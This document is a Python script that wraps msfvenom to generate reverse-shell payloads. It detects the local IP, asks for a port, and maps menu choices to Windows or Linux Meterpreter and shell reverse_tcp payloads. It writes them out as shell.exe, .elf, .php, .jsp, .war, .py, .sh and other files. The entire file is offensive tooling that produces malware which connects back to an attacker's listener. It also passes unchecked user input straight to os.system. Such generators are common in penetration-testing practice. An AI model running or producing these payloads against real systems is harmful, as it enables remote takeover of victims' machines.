#!/usr/bin/python3

import os
import sys


print("Payload Generator")
print("")

###### Getting IP
print("[+] Finding currently used network adapters")
os.system("ifconfig | grep flags | cut -d ':' -f 1")
print("")
ip_choice = input("[++] Please choice which adapter you are using. ")
print("")
print("Your IP address is...")
ip1 = os.popen("ifconfig {adp} | grep 'inet ' | cut -d ' ' -f 10".format(adp=ip_choice)).read()
ip = ip1.rstrip()
print(ip)


###### Setting Port
port = input("[++] Please enter port you will be listening on. ")
print("")



###### Setting payload
print("[+] Building payload...")
type_1 = input("   [++] Staged or Stageless? (1 or 2): ")
type_2 = input("   [++] Meterpreter or Standard? (1 or 2): ")
os1 = input("   [++] Windows or Linux? (1 or 2): ")
os_arc = input("   [++] x86 or x64? (1 or 2): ")
payload = ""

# Meterpreter Staged
if type_1 == "1" and type_2 == "1" and os1 == "1" and os_arc == "1":
    payload = "windows/meterpreter/reverse_tcp"
if type_1 == "1" and type_2 == "1" and os1 == "1" and os_arc == "2":
    payload = "windows/x64/meterpreter/reverse_tcp"
if type_1 == "1" and type_2 == "1" and os1 == "2" and os_arc == "1":
    payload = "linux/x86/meterpreter/reverse_tcp"
if type_1 == "1" and type_2 == "1" and os1 == "2" and os_arc == "2":
    payload = "linux/x64/meterpreter/reverse_tcp"

# Meterpreter Stageless
if type_1 == "2" and type_2 == "1" and os1 == "1" and os_arc == "1":
    payload = "windows/meterpreter_reverse_tcp"
if type_1 == "2" and type_2 == "1" and os1 == "1" and os_arc == "2":
    payload = "windows/x64/meterpreter_reverse_tcp"
if type_1 == "2" and type_2 == "1" and os1 == "2" and os_arc == "1":
    payload = "linux/x86/meterpreter_reverse_tcp"
if type_1 == "2" and type_2 == "1" and os1 == "2" and os_arc == "2":
    payload = "linux/x64/meterpreter_reverse_tcp"



# Standard Stanged
if type_1 == "1" and type_2 == "2" and os1 == "1" and os_arc == "1":
    payload = "windows/shell/reverse_tcp"
if type_1 == "1" and type_2 == "2" and os1 == "1" and os_arc == "2":
    payload = "windows/x64/shell_reverse_tcp"
if type_1 == "1" and type_2 == "2" and os1 == "2" and os_arc == "1":
    payload = "linux/x86/shell/reverse_tcp"
if type_1 == "1" and type_2 == "2" and os1 == "2" and os_arc == "2":
    payload = "linux/x64/shell/reverse_tcp"

# Standard Stangeless
if type_1 == "2" and type_2 == "2" and os1 == "1" and os_arc == "1":
    payload = "windows/shell_reverse_tcp"
if type_1 == "2" and type_2 == "2" and os1 == "1" and os_arc == "2":
    payload = "windows/x64/shell_reverse_tcp"
if type_1 == "2" and type_2 == "2" and os1 == "2" and os_arc == "1":
    payload = "linux/x86/shell_reverse_tcp"
if type_1 == "2" and type_2 == "2" and os1 == "2" and os_arc == "2":
    payload = "linux/x64/shell_reverse_tcp"


# Used for Error Handling
if payload == "":
    print("Something went wrong... Please check inputs.   Exiting...")
    sys.exit()

print("")
print("[+] Supported file types...")
print("1 = .exe    5 = .aspx    9 = .py")
print("2 = .elf    6 = .jsp    10 = .sh")
print("3 = .php    7 = .war")
print("4 = .asp    8 = .pl")
set_file_type = input("   [++] Choose a supported file type: ")

if set_file_type == "1":
    file_type = "exe"
elif set_file_type == "2":
    file_type = "elf"
elif set_file_type == "3":
    file_type = "php"
    payload = "php/reverse_php"
elif set_file_type == "4":
    file_type = "asp"
elif set_file_type == "5":
    file_type = "aspx"
elif set_file_type == "6":
    file_type = "jsp"
    payload = "java/jsp_shell_reverse_tcp"
elif set_file_type == "7":
    file_type = "war"
    payload = "java/jsp_shell_reverse_tcp"
elif set_file_type == "8":
    file_type = "pl"
    payload = "cmd/unix/reverse_perl"
elif set_file_type == "9":
    file_type = "py"
    payload = "cmd/unix/reverse_python"
elif set_file_type == "10":
    file_type = "sh"
    payload = "cmd/unix/reverse_bash"
else:
    print("Something went wrong... Please check inputs.   Exiting...")
    sys.exit()
print("")

del_file = "shell.{file}".format(file=file_type)
if os.path.isfile(del_file):
    os.system("rm -r {file}".format(file=del_file))


print("Payload ready")
msf_command = "msfvenom -p {payload} LHOST={ip} LPORT={port} -f {file} > shell.{file}".format(payload=payload,ip=ip,port=port,file=file_type)
print(msf_command)
print("")


os.system(msf_command)
